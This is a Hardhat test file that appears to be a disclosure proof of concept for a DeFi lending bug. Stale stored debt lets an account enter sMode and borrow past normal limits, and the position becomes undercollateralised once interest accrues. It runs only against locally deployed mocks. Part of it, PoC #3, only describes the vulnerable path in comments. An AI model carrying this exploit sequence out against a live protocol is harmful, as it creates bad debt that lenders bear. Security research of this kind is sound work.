import { expect } from "chai";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

const BASE = ethers.parseEther("1");
const CF = ethers.parseEther("0.9");
const BF = ethers.parseEther("1");

const SMODE_LTV = ethers.parseEther("0.95");
const SMODE_LT  = ethers.parseEther("0.97");

const SUPPLY_CAP = ethers.parseEther("1000000");
const BORROW_CAP = ethers.parseEther("1000000");

const ONE = ethers.parseEther("1");

function fmt(v: bigint) {
  return ethers.formatEther(v);
}

describe("PoC - enterSMode stale interest bypass", function () {

  let deployer: HardhatEthersSigner;
  let attacker: HardhatEthersSigner;
  let innocent: HardhatEthersSigner;

  let underlyingA:any;
  let underlyingB:any;

  let iTokenA:any;
  let iTokenB:any;

  let controller:any;
  let oracle:any;
  let rewardDist:any;

  let irmNoRate:any;
  let irmLowRate:any;

  async function baseSetup() {

    [deployer, attacker, innocent] =
      await ethers.getSigners();

    const Token = await ethers.getContractFactory("Token");

    underlyingA =
      await Token.deploy(
        "Mock USDC",
        "USDC",
        18n
      );

    underlyingB =
      await Token.deploy(
        "Mock WETH",
        "WETH",
        18n
      );

    const NoRate =
      await ethers.getContractFactory(
        "MockRateModelNoInterest"
      );

    irmNoRate = await NoRate.deploy();
    await irmNoRate.setIsInterestRateModel(true);

    const LowRate =
      await ethers.getContractFactory(
        "MockLowRateModel"
      );

    irmLowRate = await LowRate.deploy();

    const Oracle =
      await ethers.getContractFactory(
        "PriceOracleV2"
      );

    oracle =
      await Oracle.deploy(
        deployer.address,
        ethers.parseEther("0.1")
      );

    const Controller =
      await ethers.getContractFactory(
        "Controller"
      );

    controller = await Controller.deploy();
    await controller.initialize();

    const Reward =
      await ethers.getContractFactory(
        "RewardDistributor"
      );

    rewardDist = await Reward.deploy();

    await rewardDist.initialize(
      controller.target
    );

    await controller._setRewardDistributor(
      rewardDist.target
    );

    await controller._setPriceOracle(
      oracle.target
    );

    await controller._setCloseFactor(
      ethers.parseEther("0.5")
    );

    await controller._setLiquidationIncentive(
      ethers.parseEther("1.1")
    );

    const IToken =
      await ethers.getContractFactory(
        "iToken"
      );

    iTokenA = await IToken.deploy();

    await iTokenA.initialize(
      underlyingA.target,
      "dForce USDC",
      "iUSDC",
      controller.target,
      irmNoRate.target
    );

    iTokenB = await IToken.deploy();

    await iTokenB.initialize(
      underlyingB.target,
      "dForce WETH",
      "iWETH",
      controller.target,
      irmNoRate.target
    );

    await oracle.setPrice(
      iTokenA.target,
      BASE
    );

    await oracle.setPrice(
      iTokenB.target,
      BASE
    );

    await controller._addMarket(
      iTokenA.target,
      CF,
      BF,
      SUPPLY_CAP,
      BORROW_CAP,
      0n
    );

    await controller._addMarket(
      iTokenB.target,
      CF,
      BF,
      SUPPLY_CAP,
      BORROW_CAP,
      0n
    );

    const liquidity =
      ethers.parseEther("10000");

    await underlyingB.mint(
      innocent.address,
      liquidity
    );

    await underlyingB
      .connect(innocent)
      .approve(
        iTokenB.target,
        liquidity
      );

    await iTokenB
      .connect(innocent)
      .mint(
        innocent.address,
        liquidity
      );
  }

  async function createBorrowPosition(
    borrowAmount: bigint
  ) {
    const collateral =
      ethers.parseEther("100");

    await underlyingA.mint(
      attacker.address,
      collateral
    );

    await underlyingA
      .connect(attacker)
      .approve(
        iTokenA.target,
        collateral
      );

    await iTokenA
      .connect(attacker)
      .mint(
        attacker.address,
        collateral
      );

    await controller
      .connect(attacker)
      .enterMarkets(
        [iTokenA.target]
      );

    await iTokenB
      .connect(attacker)
      .borrow(
        borrowAmount
      );
  }

  beforeEach(async()=>{
    await baseSetup();
  });


  it("PoC #1 stale borrowBalanceStored hides interest", async()=>{

    await createBorrowPosition(
      ethers.parseEther("80")
    );

    const before=
      await iTokenB.borrowBalanceStored(
        attacker.address
      );

    await iTokenB._setInterestRateModel(
      irmLowRate.target
    );

    await ethers.provider.send(
      "hardhat_mine",
      ["0x5"]
    );

    const stale=
      await iTokenB.borrowBalanceStored(
        attacker.address
      );

    expect(stale).eq(before);

    await iTokenB.updateInterest();

    const fresh=
      await iTokenB.borrowBalanceStored(
        attacker.address
      );

    console.log("\n=== STALE INTEREST ===");
    console.log("stored:",fmt(stale));
    console.log("fresh :",fmt(fresh));
    console.log(
      "hidden:",
      fmt(fresh-stale)
    );

    expect(fresh).gt(stale);

  });


  it("PoC #2 stale equity passes but fresh has shortfall", async()=>{

    await createBorrowPosition(
      ethers.parseEther("89.9")
    );

    await iTokenB._setInterestRateModel(
      irmLowRate.target
    );

    await ethers.provider.send(
      "hardhat_mine",
      ["0x64"]
    );

    const [, staleShortfall] =
      await controller.calcAccountEquity(
        attacker.address
      );

    await iTokenB.updateInterest();

    const [, freshShortfall] =
      await controller.calcAccountEquity(
        attacker.address
      );

    console.log("\n=== EQUITY BYPASS ===");
    console.log(
      "stale shortfall:",
      fmt(staleShortfall)
    );

    console.log(
      "fresh shortfall:",
      fmt(freshShortfall)
    );

    expect(staleShortfall).eq(0n);
    expect(freshShortfall).gt(0n);

  });


  it("PoC #3 enterSMode validation uses stale debt", async()=>{

    /*
      Demonstrates:
      enterSMode would pass
      using stale borrowBalanceStored()
      while true accrued debt creates shortfall.
    */

    await createBorrowPosition(
      ethers.parseEther("89.9")
    );

    await iTokenB._setInterestRateModel(
      irmLowRate.target
    );

    await ethers.provider.send(
      "hardhat_mine",
      ["0x64"]
    );

    const storedDebt =
      await iTokenB.borrowBalanceStored(
        attacker.address
      );

    const staleEq=
      await controller.calcAccountEquity(
        attacker.address
      );

    console.log("\n=== BEFORE ACCRUE ===");
    console.log(
      "stale debt:",
      fmt(storedDebt)
    );

    expect(staleEq[1]).eq(0n);

    /*
      Simulated vulnerable path:
      enterSMode would rely here on stale equity.
    */

    await iTokenB.updateInterest();

    const actualDebt=
      await iTokenB.borrowBalanceStored(
        attacker.address
      );

    const freshEq=
      await controller.calcAccountEquity(
        attacker.address
      );

    console.log("\n=== AFTER ACCRUE ===");
    console.log(
      "actual debt:",
      fmt(actualDebt)
    );

    console.log(
      "real shortfall:",
      fmt(freshEq[1])
    );

    expect(freshEq[1]).gt(0n);

  });

  it("PoC #4 actual exploit path: enterSMode enables undercollateralized debt via stale accounting", async()=>{

    /*
        Exploit sequence:
        1. Enter sMode while healthy.
        2. Use boosted LTV to borrow beyond normal limit.
        3. Interest accrues invisibly (stale borrowBalanceStored).
        4. Position becomes insolvent only after accrual.
        5. Insolvent state exists after protocol already granted extra leverage.
    */

    const ExtraImplicit =
        await ethers.getContractFactory(
        "ControllerV2ExtraImplicit"
        );

    const extraImplicit =
        await ExtraImplicit.deploy();

    const ExtraExplicit =
        await ethers.getContractFactory(
        "ControllerV2ExtraExplicit"
        );

    const extraExplicit =
        await ExtraExplicit.deploy();

    const ControllerV2 =
        await ethers.getContractFactory(
        "ControllerV2"
        );

    const ctrlV2 =
        await ControllerV2.deploy(
        extraImplicit.target,
        extraExplicit.target
        );

    const Reward =
        await ethers.getContractFactory(
        "RewardDistributor"
        );

    const rd = await Reward.deploy();

    await rd.initialize(
        ctrlV2.target
    );

    await ctrlV2._setRewardDistributor(
        rd.target
    );

    await ctrlV2._setPriceOracle(
        oracle.target
    );

    await ctrlV2._setCloseFactor(
        ethers.parseEther("0.5")
    );

    await ctrlV2._setLiquidationIncentive(
        ethers.parseEther("1.1")
    );

    const IToken =
        await ethers.getContractFactory(
        "iToken"
        );

    const iTA = await IToken.deploy();

    await iTA.initialize(
        underlyingA.target,
        "USDC v2",
        "iUSDCv2",
        ctrlV2.target,
        irmNoRate.target
    );

    const iTB = await IToken.deploy();

    await iTB.initialize(
        underlyingB.target,
        "WETH v2",
        "iWETHv2",
        ctrlV2.target,
        irmNoRate.target
    );

    await oracle.setPrice(iTA.target, BASE);
    await oracle.setPrice(iTB.target, BASE);

    for (const m of [iTA, iTB]) {

        await ctrlV2._addMarketV2({
        _iToken:m.target,
        _collateralFactor:CF,
        _borrowFactor:BF,
        _supplyCapacity:SUPPLY_CAP,
        _borrowCapacity:BORROW_CAP,
        _distributionFactor:0n,
        _liquidationThreshold:CF,
        _sModeID:0,
        _sModeLtv:0n,
        _sModeLiqThreshold:0n,
        _borrowableInSegregation:false,
        _debtCeiling:0n
        });
    }

    const smode =
        await ethers.getContractAt(
        "ControllerV2ExtraImplicit",
        ctrlV2.target
        );

    await smode._addSMode(
        ethers.parseEther("1.05"),
        ethers.parseEther("0.5"),
        "Stable"
    );

    await smode._setSMode(
        iTA.target,
        1,
        SMODE_LTV,
        SMODE_LT
    );

    await smode._setSMode(
        iTB.target,
        1,
        SMODE_LTV,
        SMODE_LT
    );

    /*
        lender liquidity
    */

    const liquidity=
        ethers.parseEther("10000");

    await underlyingB.mint(
        innocent.address,
        liquidity
    );

    await underlyingB.connect(innocent)
        .approve(
        iTB.target,
        liquidity
        );

    await iTB.connect(innocent)
        .mint(
        innocent.address,
        liquidity
        );

    /*
        attacker collateral
    */

    const collateral=
        ethers.parseEther("100");

    await underlyingA.mint(
        attacker.address,
        collateral
    );

    await underlyingA.connect(attacker)
        .approve(
        iTA.target,
        collateral
        );

    await iTA.connect(attacker)
        .mint(
        attacker.address,
        collateral
        );

    await ctrlV2.connect(attacker)
        .enterMarkets(
        [iTA.target]
        );

    /*
        exploit starts
    */

    await smode.connect(attacker)
        .enterSMode(1);

    const normalLimit =
        ethers.parseEther("90");

    const boostedLimit =
        ethers.parseEther("95");

    console.log("\n=== EXPLOIT STEP 1 ===");
    console.log("Normal limit :",fmt(normalLimit));
    console.log("sMode limit  :",fmt(boostedLimit));

    /*
        only possible due to sMode
    */

    const exploitBorrow=
        ethers.parseEther("94.9");

    expect(
        exploitBorrow
    ).gt(normalLimit);

    await iTB.connect(attacker)
        .borrow(exploitBorrow);

    console.log("\n=== EXPLOIT STEP 2 ===");
    console.log(
        "Borrow using sMode:",
        fmt(exploitBorrow)
    );

    await iTB._setInterestRateModel(
        irmLowRate.target
    );

    await ethers.provider.send(
        "hardhat_mine",
        ["0xA"]
    );

    const staleDebt =
        await iTB.borrowBalanceStored(
        attacker.address
        );

    const [, staleSf] =
        await ctrlV2.calcAccountEquity(
        attacker.address
        );

    console.log("\n=== STALE VIEW ===");
    console.log("Debt:",fmt(staleDebt));
    console.log("Shortfall:",fmt(staleSf));

    expect(staleSf).eq(0n);

    /*
        reveal insolvency
    */

    await iTB.updateInterest();

    const realDebt =
        await iTB.borrowBalanceStored(
        attacker.address
        );

    const [, realSf] =
        await ctrlV2.calcAccountEquity(
        attacker.address
        );

    console.log("\n=== AFTER ACCRUAL ===");
    console.log("Debt:",fmt(realDebt));
    console.log("Shortfall:",fmt(realSf));

    const excess =
        realDebt-boostedLimit;

    console.log(
        "Debt above sMode ceiling:",
        fmt(excess)
    );

    /*
        exploit invariants
    */

    expect(realDebt)
        .gt(boostedLimit);

    expect(realSf)
        .gt(0n);

    /*
        strongest proof:
        protocol granted leverage
        that becomes bad debt post accrual
    */
    expect(exploitBorrow)
        .gt(normalLimit);
    });

  it("Impact: sMode adds extra borrow capacity", async()=>{

    const normalMax =
      ethers.parseEther("100")
      * CF
      / ONE;

    const sModeMax =
      ethers.parseEther("100")
      * SMODE_LTV
      / ONE;

    const extra =
      sModeMax-normalMax;

    console.log("\n=== IMPACT ===");
    console.log(
      "normal:",
      fmt(normalMax)
    );

    console.log(
      "smode:",
      fmt(sModeMax)
    );

    console.log(
      "extra:",
      fmt(extra)
    );

    expect(extra).eq(
      ethers.parseEther("5")
    );

  });


  it("Risk: hidden interest nearly offsets sMode gain", async()=>{

    const borrowAmt=
      ethers.parseEther("89.9");

    const rate=
      ethers.parseEther("0.0005");

    const blocks=100n;

    const hiddenInterest =
      borrowAmt *
      rate /
      ONE *
      blocks;

    const extra=
      ethers.parseEther("5");

    const coverage =
      hiddenInterest*
      100n/
      extra;

    console.log("\n=== RISK ===");
    console.log(
      "hidden interest:",
      fmt(hiddenInterest)
    );

    console.log(
      "coverage:",
      coverage.toString(),
      "%"
    );

    expect(
      hiddenInterest
    ).gte(
      ethers.parseEther("4.4")
    );

    expect(
      coverage
    ).gte(
      89n
    );

  });

});